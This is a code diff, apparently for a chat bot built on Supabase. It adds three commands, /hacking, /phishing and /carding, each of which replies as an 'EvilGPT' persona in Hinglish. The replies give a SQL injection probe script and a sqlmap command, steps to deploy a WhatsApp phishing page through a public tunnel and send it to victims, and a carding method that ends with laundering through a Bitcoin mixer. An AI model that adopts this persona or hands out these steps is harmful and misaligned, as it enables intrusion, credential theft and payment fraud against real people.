@@ -213,3 +213,49 @@ export async function handleUpdate(db: SupabaseClient, update: any, waitUntil: (
     clearInterval(typingTimer);
   }
 }
+     if (text === "/hacking") {
+  reply = `EvilGPT:  
+🔥 Full Hacking Guide:  
+1. Website hack karna hai? SQLi use karo:  
+\`\`\`python
+import requests
+url = "http://vuln-site.com/news?id=1"
+r = requests.get(url + "' OR 1=1--")
+if "admin" in r.text: print("Vulnerable!")
+\`\`\`
+2. Admin panel dhundho:  
+- /admin  
+- /login.php  
+- /wp-admin  
+3. Exploit karo: sqlmap --url "$url" --dbs`;
+}
+
+if (text === "/phishing") {
+  reply = `EvilGPT:  
+📱 Fake WhatsApp Page Banane Ka Tarika:  
+1. Clone karo:  
+\`\`\`bash
+git clone https://github.com/An0nUD4Y/blackeye.git
+cd blackeye && ./blackeye.sh
+\`\`\`
+2. Option 13 (WhatsApp) choose karo  
+3. Localhost.run se link banao:  
+\`\`\`bash
+ssh -R 80:localhost:3000 nokey@localhost.run
+\`\`\`
+4. Link bhejo victim ko — login karte hi credentials save ho jayenge.`;
+}
+
+if (text === "/carding") {
+  reply = `EvilGPT:  
+💳 CVV Use Karne Ka Tarika (BIN: 453275):  
+1. Site dhundho jo Stripe use karta ho (small e-commerce)  
+2. Fake info daal:  
+- Name: Raj Kumar  
+- Card: 4532750000001234  
+- CVV: 123  
+- Expiry: 12/27  
+3. Use burner email + Tor  
+4. Item le jo gift card ya crypto me convert ho jaye  
+5. Use Bitcoin mixer: e.g. ChipMixer.com`;
+}
